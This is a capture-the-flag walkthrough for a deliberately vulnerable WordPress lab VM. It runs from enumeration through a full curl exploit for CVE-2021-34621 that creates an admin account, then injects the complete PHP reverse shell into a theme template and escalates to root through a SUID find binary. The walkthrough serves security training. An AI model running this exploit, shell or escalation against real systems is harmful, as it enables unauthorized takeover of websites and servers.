# Walkthrough womenhackers

## 1. Import womenhackers.ova in your VirtualBox.

## 2. Network configuration. 

Before starting womenhackers machine and your attacker machine, make sure both of them are in the same network range. For this lab, we will assume that we are using a Host-Only Internet adapter. We'll be working on 192.168.57.0/24 network range. 

## 3. Identify your IP and enumerate other IPs in your network range.

```bash
ip a
```

Results:

```bash
Nmap scan report for 192.168.57.3
Host is up (0.00038s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

From now on, for the purpose of this walkthrough we will assume the attacked machine has IP 192.168.57.3. The attacker machine will have IP 192.168.57.4. You may use different IPs depending on your network setup.

## 4. Enumerate open ports with nmap (you will find ports 22 and 80).

```bash
sudo nmap -sCV -p22,80 -oN 192.168.57.3
```

Results:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Ubuntu 6ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f4:27:a6:52:4c:6c:dd:92:f4:d6:10:f2:67:f0:f3:5a (RSA)
|   256 f3:e9:39:9b:b4:48:ef:49:7a:69:33:a9:15:20:53:9d (ECDSA)
|_  256 95:9e:a5:ad:28:2a:fe:6a:9b:56:9b:58:e2:10:9e:27 (ED25519)
80/tcp open  http    Apache httpd 2.4.48 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/womenhackers
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.48 (Ubuntu)
MAC Address: 08:00:27:55:C6:47 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

One insteresting thing here: we have a robots.txt file that disallows the entry /womenhackers.

## 5. Open http://192.168.57.3/womenhackers in your browser.
There are more ways to get there. If you enumerate directories under http://192.168.57.3 you can find for instance, info.php (with a commented line in the code pointing out to /womenhackers).

## 6. Identify the CMS.
Inspect the HTML code and you will see the prefix "wp" in many html classes, which may means we are in front of a wordpress CMS. As a matter of fact, in some lines you can read:

```
http://192.168.57.3/womenhackers/wp-content/themes/oceanwp/...
```

Now that we know that the service is a wordpress, we could use an specific scan tool for this CMS.


## 7. Enumerate directories and plugins with wpscan

From your attacker machine, run:

```bash
wpscan --url http://192.168.57.3/womenhackers
```

Results:

```bash
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.57.3/womenhackers/ [192.168.57.3]
[+] Started: Mon Oct 31 07:48:32 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.48 (Ubuntu)
 |  - X-UA-Compatible: IE=edge
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.57.3/womenhackers/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.57.3/womenhackers/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] This site has 'Must Use Plugins': http://192.168.57.3/womenhackers/wp-content/mu-plugins/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 80%
 | Reference: http://codex.wordpress.org/Must_Use_Plugins

[+] Upload directory has listing enabled: http://192.168.57.3/womenhackers/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.57.3/womenhackers/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.0.3 identified (Latest, released on 0001-01-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.57.3/womenhackers/feed/, <generator>https://wordpress.org/?v=6.0.3</generator>
 |  - http://192.168.57.3/womenhackers/comments/feed/, <generator>https://wordpress.org/?v=6.0.3</generator>

[+] WordPress theme in use: oceanwp
 | Location: http://192.168.57.3/womenhackers/wp-content/themes/oceanwp/
 | Last Updated: 2022-09-14T00:00:00.000Z
 | Readme: http://192.168.57.3/womenhackers/wp-content/themes/oceanwp/readme.txt
 | [!] The version is out of date, the latest version is 3.3.5
 | Style URL: http://192.168.57.3/womenhackers/wp-content/themes/oceanwp/style.css
 | Style Name: OceanWP
 | Style URI: https://oceanwp.org/
 | Description: OceanWP is the perfect theme for your project. Lightweight and highly extendable, it will enable you...
 | Author: OceanWP
 | Author URI: https://oceanwp.org/about-me/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 3.1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.57.3/womenhackers/wp-content/themes/oceanwp/style.css, Match: 'Version:            3.1.3'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] elementor
 | Location: http://192.168.57.3/womenhackers/wp-content/plugins/elementor/
 | Last Updated: 2022-10-02T15:12:00.000Z
 | [!] The version is out of date, the latest version is 3.7.8
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 3.5.6 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://192.168.57.3/womenhackers/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.5.6
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.57.3/womenhackers/wp-content/plugins/elementor/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.57.3/womenhackers/wp-content/plugins/elementor/readme.txt

[+] ocean-extra
 | Location: http://192.168.57.3/womenhackers/wp-content/plugins/ocean-extra/
 | Last Updated: 2022-10-04T06:50:00.000Z
 | [!] The version is out of date, the latest version is 2.0.5
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.9.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.57.3/womenhackers/wp-content/plugins/ocean-extra/readme.txt

[+] ocean-social-sharing
 | Location: http://192.168.57.3/womenhackers/wp-content/plugins/ocean-social-sharing/
 | Last Updated: 2022-05-25T07:08:00.000Z
 | [!] The version is out of date, the latest version is 2.0.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 2.0.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.57.3/womenhackers/wp-content/plugins/ocean-social-sharing/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.57.3/womenhackers/wp-content/plugins/ocean-social-sharing/readme.txt

[+] wp-user-avatar
 | Location: http://192.168.57.3/womenhackers/wp-content/plugins/wp-user-avatar/
 | Last Updated: 2022-10-21T10:54:00.000Z
 | [!] The version is out of date, the latest version is 4.3.0
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 3.1.3 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.57.3/womenhackers/wp-content/plugins/wp-user-avatar/readme.txt

[+] wpforms-lite
 | Location: http://192.168.57.3/womenhackers/wp-content/plugins/wpforms-lite/
 | Last Updated: 2022-10-12T11:48:00.000Z
 | [!] The version is out of date, the latest version is 1.7.7.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.7.2.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.57.3/womenhackers/wp-content/plugins/wpforms-lite/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.57.3/womenhackers/wp-content/plugins/wpforms-lite/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:03 <=================================================> (137 / 137) 100.00% Time: 00:00:03

[i] No Config Backups Found.
```

One of the outdated plugins grabs our attention: wp-user-avatar. According to the scanner, current version on the server is 3.1.3 and the update one would be 4.3.0. A search in google returns:
+ https://www.exploit-db.com/exploits/50242
+ https://www.cybersecurity-help.cz/vdb/SB2021081401


## 8. Exploit (CVE-2021-34621)[https://www.exploit-db.com/exploits/50242]

This exploit (CVE-2021-34621)[https://www.exploit-db.com/exploits/50242] is a very simple bash code that requires a basic level of bash understanding. It’s not yet available on metasploit database, which means you will have to understand it in order to execute it. 
Basically it helps you to create an admin user in the wordpress installation. 

In the attacker machine, creates a script.sh file with this content:

```bash 
#!/bin/bash
# Exploit for WordPress Plugin ProfilePress 3.0 - 3.1.3 
# Change the name and password as per your requirement.

URL=$1

curl -X POST $URL"/wp-admin/admin-ajax.php" \
 -H "Content-Type: application/x-www-form-urlencoded" \
 -d "reg_username=admin" \
 -d "reg_email=pwned@mujerorquesta.com" \
 -d "reg_password=admin" \
 -d "reg_password_present=true" \
 -d "wp_capabilities[administrator]=1" \
 -d "reg_first_name=pwned" \
 -d "reg_last_name=lalala" \
 -d "action=pp_ajax_signup"
```

After editing the file, add permissions to execute:

```bash
chmod +x script.sh
```

And run it:

```bash
./script.sh http://192.168.57.3/womenhackers
```

This will create an "admin" user in the wordpress CMS.

## 9. Access as admin

Go to http://192.168.57.3/womenhackers/wp-admin and access the pannel with 
+ user: admin
+ password: admin

If you have defined different user and password credentials, use them instead of these.

## 10. Launch a reverse shell.

Wordpress is written in php. We could use the php reverse shell of pentesmonkey. Get it from (Pentestmonkey Github)[https://github.com/pentestmonkey/php-reverse-shell]. In my case, my shell would be this code (IP and port are customized). 

```

  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '192.168.57.4';  // You have changed this
  $port = 12345;  // And this
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = 'uname -a; w; id; /bin/sh -i';
  $daemon = 0;
  $debug = 0;

  //
  // Daemonise ourself if possible to avoid zombies later
  //

  // pcntl_fork is hardly ever available, but will allow us to daemonise
  // our php process and avoid zombies.  Worth a try...
  if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
      printit("ERROR: Can't fork");
      exit(1);
    }
    
    if ($pid) {
      exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
    }

    $daemon = 1;
  } else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
  }

  // Change to a safe directory
  chdir("/");

  // Remove any umask we inherited
  umask(0);

  //
  // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
  }

  // Set everything to non-blocking
  // Reason: Occsionally reads will block, even though stream_select tells us they won't
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit("Successfully opened reverse shell to $ip:$port");

  while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
      printit("ERROR: Shell connection terminated");
      break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
      printit("ERROR: Shell process terminated");
      break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
    }

    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
    }

    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

  // Like print, but does nothing if we've daemonised ourself
  // (I can't figure out how to redirect STDOUT like a proper daemon)
  function printit ($string) {
    if (!$daemon) {
      print "$string
";
    }
  }

  ?> 
  
```

In the administration pannel you can go to "Apariencias>Editor de Archivos de temas". Once there, select a php template that is called when a page is loaded in the web site. In my case, I chose the template single.php. At the end of the file, I copy paste my php reverse shell and save the changes with the "Actualizar" button.

Now, from your attacker machine, run:

```bash
nc -lnvp 12345
```

And, in the browser go to a page that you know that calls the template in which you have saved your php reverse shell. In my case, having used single.php, I can browse to: http://192.168.57.3/womenhackers/carol-shaw/ to launch my reverse shell.

## 11. Get user.txt flag

For that you can gather some system information. Run:

```bash
whoami
id
```

And find user.txt

```bash
find / -name "user.txt" 2>/dev/null
```

Results:

```
/var/www/html/user.txt
```

To echo it, you will need to give it read permissions 

```bash
chmod +r /var/www/html/user.txt
cat /var/www/html/user.txt
```


## 12. Get root.txt flag.

Run:

```bash
find / -perm /4000 2>/dev/null
```

Having a look at the results, you can see listed the command find. If we run:

```bash
ls -la /bin/find
```

We can see the suid bit enabled:

```
-rwsr-xr-x 1 root root 286184 Jul 14  2021 /bin/find
```

Knowing this, we can escalate privileges. (This web provides you with some resources to exploit suid bit)[https://gtfobins.github.io/gtfobins/find/]. Run:

```bash
sudo find . -exec /bin/sh \; -quit
whoami
```

Results:

```
root
```

Now we can echo root.txt

```bash
cat /root/root.txt
```


